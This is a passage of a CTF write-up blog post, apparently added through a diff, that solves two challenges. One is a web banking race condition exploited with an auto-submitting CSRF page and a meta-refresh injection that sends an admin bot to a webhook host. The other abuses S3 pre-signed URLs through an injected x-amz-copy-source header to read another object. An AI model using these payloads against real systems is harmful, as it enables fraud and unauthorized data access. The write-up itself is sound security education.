+</span></span></code></pre></div><p>Here we can see an extra functionality surrounding &ldquo;transaction_id&rdquo;. If the data parameter contains the key <code>transaction_id</code> we are able to edit attributes of the transaction other than the <code>status</code> attribute which sadly gets deleted. <code>data</code> parameter is nothing but <code>dict(form.data)</code> which is passed from <code>views.py</code>. Hence our focus goes towards the other attributes which we can control now, specifically the <code>amount</code> attribute.</p>
+<p>Like we have noticed before, there is a race window between when <code>confirm_transaction()</code> and <code>send_transaction()</code> is called. Within this window, if we are able to change the amount of an already confirmed but not completed transaction, we can bypass the &lt;= 10LP limit. So the control flow looks like this:</p>
+<ul>
+<li>We make the manager create a new transaction with amount = 10 to attacker account.</li>
+<li><code>confirm_transaction()</code> gets called and <code>transaction.status</code> is set to <code>confirmed</code></li>
+<li>We make the manager send a create-transaction action with the <code>transaction_id</code>(transaction id&rsquo;s are incremental) of the above transaction. This request sets the <code>amount</code> attribute to 999999999.</li>
+<li><code>send_transaction()</code> gets called which increases attacker account balance by 999999999</li>
+<li>We call the <code>delete-account-and-get-flag</code> and get flag!
+Combining this with the first stage exploit, we get the final solution.</li>
+</ul>
+<h3 id="final-exploit">Final Exploit</h3>
+<ol>
+<li>host the following payload on attacker controlled site/webhook.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame1&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frame2&#34;</span> <span style="color:#a6e22e">style</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;display: none;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cool&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://web:8000/?action=create-transaction&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> &gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recipient&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alfinalfin&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amount&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notcool&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://web:8000/?action=create-transaction&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;recipient&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;alfinalfin&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amount&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;999999999&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;transaction_id&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;11&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">defer</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">setTimeout</span>(()=&gt;{document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;cool&#39;</span>).<span style="color:#a6e22e">submit</span>();},<span style="color:#ae81ff">15</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">setTimeout</span>(()=&gt;{document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;notcool&#39;</span>).<span style="color:#a6e22e">submit</span>();},<span style="color:#ae81ff">50</span>) <span style="color:#75715e">// might have to tinker around a bit with timeout interval to hit the race window.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><ol start="2">
+<li>send the following url as order problem which will be visited by the admin bot</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://web:8000/?action=faq&amp;question=pr%20%3Cmeta%20http-equiv=%22refresh%22%20content=%221;url=http://webhook.site/1f2ca6d7-e5b4-4607-b2f1-26c8b0d9dabe%22%20/%3E
+</span></span></code></pre></div><p>Wait a few seconds and we can see our balance skyrocket. Call the <code>delete-account-and-get-flag</code> action and get flag.
+<img src="image-4.png" alt="flagimage"></p>
+<blockquote>
+<p>Flag = midnight{UnL0ck_54v1N6s_t0D4y_w1th_XSS_4nd_r4C3s}</p></blockquote>
+<hr>
+<h2 id="shot-host">Shot Host</h2>
+<p><strong>Challenge points</strong>: 200
+<strong>No. of solves</strong>: 41</p>
+<h3 id="challenge-description-1">Challenge Description</h3>
+<p>This screenshot hosting platform is a modern web app making heavy use of serverless architecture. No server—no bugs, right? Grab the screenshot with the flag to prove them wrong.
+Tags - cloud, web</p>
+<h3 id="analysis-1">Analysis</h3>
+<p>We are provided with a link - <a href="http://shothost-f8nz7k4n.ctf.pro/" target="_blank">http://shothost-f8nz7k4n.ctf.pro/</a> and no source code so this is a black-box type challenge. The challenge description hints towards cloud and more specifically towards serverless architecture like <a href="https://aws.amazon.com/lambda/" target="_blank">AWS Lambda</a> which allows code to run without managing servers, which means no need to provision, administer, or manage the underlying compute resources.</p>
+<p>The website provides us with two options - upload file and copy download link. Lets take a closer look at the page source to understand how file upload works.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fread</span>(<span style="color:#a6e22e">file</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> Promise((<span style="color:#a6e22e">resolve</span>) =&gt; {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">reader</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FileReader</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">resolve</span>(<span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">readAsArrayBuffer</span>(<span style="color:#a6e22e">file</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">downloadLink</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getSignedLinks</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageInput</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;#image-input&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">imageInput</span>.<span style="color:#a6e22e">files</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sha256</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fread</span>(<span style="color:#a6e22e">file</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">lambdaUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://fkrr63ahomtqkncb4jlwiao5mi0ubyqk.lambda-url.eu-north-1.on.aws/&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">lambdaUrl</span>, <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;x-amz-content-sha256&#34;</span>, <span style="color:#a6e22e">hash</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">linkRes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">uploadRes</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">linkRes</span>.<span style="color:#a6e22e">upload</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;PUT&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;body&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">file</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;headers&#39;</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;image/png&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;x-amz-content-sha256&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">hash</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">imageInput</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#download-link-btn&#39;</span>).<span style="color:#a6e22e">hidden</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">downloadLink</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">linkRes</span>.<span style="color:#a6e22e">download</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;Screenshot uploaded&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">copyToClipboard</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ta</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#34;textarea&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ta</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">downloadLink</span>;
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">ta</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ta</span>.<span style="color:#a6e22e">select</span>();
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">execCommand</span>(<span style="color:#e6db74">&#34;copy&#34;</span>);
+</span></span><span style="display:flex;"><span>    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">ta</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The above javascript code is found from the page source. <code>getSignedLinks</code> is the function which is called when file is uploaded. The function sends a request to lambda url <code>https://fkrr63ahomtqkncb4jlwiao5mi0ubyqk.lambda-url.eu-north-1.on.aws/</code> with the sha256 has of uploaded file in the header <code>x-amz-content-sha256</code>. Then it parses the JSON response and sends a put request to the <code>upload</code> url sent by the lambda function.
+Before moving onto the main functionality, another thing I noticed here is that the website provided is hosted on Amazon S3, as indicated by the &ldquo;Server&rdquo; response header.
+<img src="image-5.png" alt="s31">
+Trying to list the items in this bucket fails as we do not seem to have permissions.
+<img src="image-6.png" alt="s3listfail">
+The only operation allowed seems to be <code>aws s3 cp s3://shothost-f8nz7k4n.ctf.pro/index.html . --no-sign-request</code> which downloads index.html.</p>
+<p>Anyway, that was a dead end so onto the main functionality.
+<img src="image-7.png" alt="lambdafunction">
+The above image shows the request and response to the lambda function. The two urls which are returned are <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/ShareObjectPreSignedURL.html" target="_blank">S3 Pre-Signed URLs</a> which are used to share objects with time-limited permission to download/upload objects. The lambda function also sends the sha256 hash of the file as a request header which is included in the <code>X-Amz-SignedHeaders</code> of the returned <code>upload</code> url. This means that the PUT request to upload file needs to have this header with the exact sha256 hash or it will return 403 forbidden <code>SignatureDoesNotMatch</code>.</p>
+<p>The upload and download url only allow access to the filename(object) generated by the server, which in the above case is <code>4053.png</code>, as the signature generated has to match. Since our goal is to get the screenshot/image with the flag, we have to find a way to access other image files in the S3 bucket. The S3 bucket that files are being uploaded to is <code>shot-host</code> which again has file listing disabled.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>The first thing I tried doing is removing the <code>X-Amz-Content-Sha256</code> header from the request to lambda url and in the response it can be observed that the headers is no longer included in the <code>X-Amz-SignedHeaders</code> parameter.
+<img src="image-8.png" alt="sha256removed">
+This meant that I am now able to upload and change the object to whatever I want as I&rsquo;m not limited by the sha256 hash check. This is not that useful in our case but we can conclude that the headers being sent to the lambda function could be our entrypoint.
+<img src="image-9.png" alt="presignurl">
+The above image from <a href="https://aws.amazon.com/blogs/compute/securing-amazon-s3-presigned-urls-for-serverless-applications/" target="_blank">here</a> seems to be a close enough representation of the scenario we have with Content-MD5 instead of X-Amz-Content-Sha256.
+Searching around for other headers which we might be able to send, we can try to prove if headers other than the sha256 header will be accepted by the lambda function to generate a pre-signed URL. <code>x-amz-meta-filename</code> is the header I tried which I found <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingMetadata.html" target="_blank">here</a>. It&rsquo;s a user-defined object metadata which has no other function here except to help us check whether we can send other headers. This worked and once we upload the file with this header, when we download, we can see this header being returned in the response.
+<img src="image-10.png" alt="meta-header"></p>
+<p>Looking at other <code>x-amz</code> headers we can send on the <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/" target="_blank">aws s3 api docs</a>, we can see a <a href="https://docs.aws.amazon.com/AmazonS3/latest/API/API_CopyObject.html" target="_blank">CopyObject</a> api which works with the <code>x-amz-copy-source: CopySource</code> header. This allows us to create a copy of an object that is already stored in the bucket. In our case, if we are able to copy the 1.png(assumed flag is in 1.png cuz object names generated are numeric in nature), we can use the object download url generated to get the flag.
+<img src="image-11.png" alt="lambdaexploit">
+<code>X-Amz-SignedHeaders</code> contains the copy-source header we sent meaning, s3 will now accept this header. Next, we have to send a PUT request with an empty request body and the <code>x-amz-copy-source</code> header.
+<img src="image-12.png" alt="S3exploit">
+Finally, we use the download url generated for our object to get the flag stored in 1.png.
+<img src="image-13.png" alt="fleglol"></p>
+<h3 id="final-exploit-1">Final Exploit</h3>
+<ol>
+<li>send request to <a href="https://fkrr63ahomtqkncb4jlwiao5mi0ubyqk.lambda-url.eu-north-1.on.aws/" target="_blank">https://fkrr63ahomtqkncb4jlwiao5mi0ubyqk.lambda-url.eu-north-1.on.aws/</a> with <code>x-amz-copy-source: /shot-host/1.png</code></li>
+<li>send empty PUT request to generated S3 pre-signed URL with header <code>x-amz-copy-source: /shot-host/1.png</code></li>
+<li>send request to the dowload URL received in step 1</li>
+</ol>
+<blockquote>
+<p>Flag = midnight{x_Amz_x_1_s3E_iD0r_3vEryWher3}</p></blockquote>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="/posts/requirednotes-bi0sctf2024/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Required Notes - bi0sCTF 2024</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hackchan">Hackchan</a>
+      <ul>
+        <li><a href="#challenge-description">Challenge Description</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#exploitation">Exploitation</a></li>
+        <li><a href="#final-exploit">Final Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#shot-host">Shot Host</a>
+      <ul>
+        <li><a href="#challenge-description-1">Challenge Description</a></li>
+        <li><a href="#analysis-1">Analysis</a></li>
+        <li><a href="#exploitation-1">Exploitation</a></li>
+        <li><a href="#final-exploit-1">Final Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
